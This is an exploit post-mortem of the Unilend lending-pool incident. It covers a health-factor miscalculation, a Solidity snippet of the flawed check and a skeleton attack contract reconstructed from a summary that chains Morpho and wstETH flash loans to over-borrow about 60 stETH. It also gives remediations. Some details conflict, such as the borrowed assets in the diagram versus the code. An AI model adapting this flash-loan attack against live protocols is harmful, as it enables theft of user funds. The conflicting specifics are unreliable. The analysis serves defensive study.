# Unilend — Over-Borrowing via Health Factor Miscalculation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-15 |
| **Protocol** | Unilend |
| **Chain** | Ethereum |
| **Loss** | ~60 stETH |
| **Attacker** | [Unidentified](https://etherscan.io/address/0x0000000000000000000000000000000000000000) |
| **Attack Tx** | [Unidentified](https://etherscan.io) |
| **Vulnerable Contract** | Unilend Lending Pool (Ethereum) |
| **Root Cause** | Health factor (collateral-to-borrow ratio) calculation error allowed borrowing far more stETH than the actual collateral value |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/Unilend_exp.sol) |

---

## 1. Vulnerability Overview

Unilend protocol's lending mechanism produced errors in health factor calculation under specific conditions (nested flash loans, position NFT transfers, pool liquidity manipulation). The attacker obtained a position NFT by depositing USDC, then took out a 60 million USDC flash loan from Morpho to manipulate a wstETH borrow position. By exploiting the miscalculated health factor, the attacker over-borrowed approximately 60 stETH beyond the actual collateral value and extracted the funds.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: flash loan funds are included in health factor calculation
function getHealthFactor(address user) public view returns (uint256) {
    uint256 collateralValue = getTotalCollateralValue(user);
    uint256 borrowValue = getTotalBorrowValue(user);
    // Temporarily inflated collateral from flash loan is reflected in the calculation
    return collateralValue * 1e18 / borrowValue;
}

function borrow(uint256 amount) external {
    uint256 hf = getHealthFactor(msg.sender);
    require(hf >= MIN_HEALTH_FACTOR, "Unhealthy position");
    // Health factor is manipulated, allowing over-borrowing
    _executeBorrow(msg.sender, amount);
}

// ✅ Safe code: blocks collateral calculation during flash loan state
modifier notInFlashLoan() {
    require(!_inFlashLoan, "Flash loan in progress");
    _;
}

function borrow(uint256 amount) external notInFlashLoan {
    uint256 hf = getHealthFactor(msg.sender);
    require(hf >= MIN_HEALTH_FACTOR, "Unhealthy position");
    _executeBorrow(msg.sender, amount);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Deposit USDC → Obtain position NFT
  │
  ├─→ [2] Transfer position NFT to attack contract
  │
  ├─→ [3] Obtain 60M USDC flash loan from Morpho
  │
  ├─→ [4] Execute wstETH nested flash loan
  │         └─ Temporarily inject large liquidity into collateral pool
  │
  ├─→ [5] Execute large-scale borrow with miscalculated health factor
  │         ├─ Borrow pETH
  │         ├─ Borrow pARB
  │         ├─ Borrow pWBTC
  │         └─ Borrow pUSDT
  │
  ├─→ [6] Convert borrowed assets → USDT
  │
  ├─→ [7] Repay Morpho flash loan
  │
  └─→ [8] ~60 stETH equivalent profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not obtained — reconstructed from summary

contract UnilendAttacker {
    address constant MORPHO = /* Morpho address */;
    address constant UNILEND_POOL = /* Unilend pool address */;

    function attack() external {
        // [1] Deposit USDC → obtain position NFT
        IERC20(USDC).approve(UNILEND_POOL, 1000e6);
        uint256 nftId = IUnilend(UNILEND_POOL).deposit(1000e6);

        // [2] Transfer NFT to attack contract
        IERC721(positionNFT).transferFrom(msg.sender, address(this), nftId);

        // [3] Morpho 60M USDC flash loan
        IMorpho(MORPHO).flashLoan(
            USDC, 60_000_000e6, abi.encode(nftId)
        );
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
        uint256 nftId = abi.decode(data, (uint256));

        // [4] Manipulate collateral pool via wstETH nested flash loan
        _executeWstETHFlashLoan();

        // [5] Execute large-scale borrow under miscalculated health factor state
        // Borrow assets exceeding actual collateral value
        IUnilend(UNILEND_POOL).borrow(nftId, stETH, 60e18);

        // [6] Convert borrowed assets
        _convertAllToProfits();

        // [7] Repay Morpho
        IERC20(USDC).approve(MORPHO, 60_000_000e6 + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Oracle/Calculation Error (Health Factor Miscalculation) |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (Flash Loan + Collateral Manipulation) |
| **DApp Category** | Lending/Borrowing Protocol |
| **Impact** | 60 stETH stolen via over-collateralized borrowing |

## 6. Remediation Recommendations

1. **Block borrowing during flash loans**: Prohibit borrow execution while a flash loan is active within the same transaction
2. **Strengthen NFT-based collateral validation**: Add collateral re-validation logic after position NFT transfers
3. **Audit health factor calculation**: Base calculations on pure on-chain balances so external liquidity injections cannot affect the result
4. **TWAP-based price feeds**: Use TWAP instead of spot prices for collateral value calculations

## 7. Lessons Learned

- In lending protocols, the health factor is the most critical security metric and must not be vulnerable to transient state changes introduced via flash loans.
- The transferability of position NFTs complicates collateral validation logic; collateral state must be re-validated upon every transfer.
- Nested flash loans are a powerful attack primitive that can simultaneously manipulate the state of multiple protocols within a single transaction.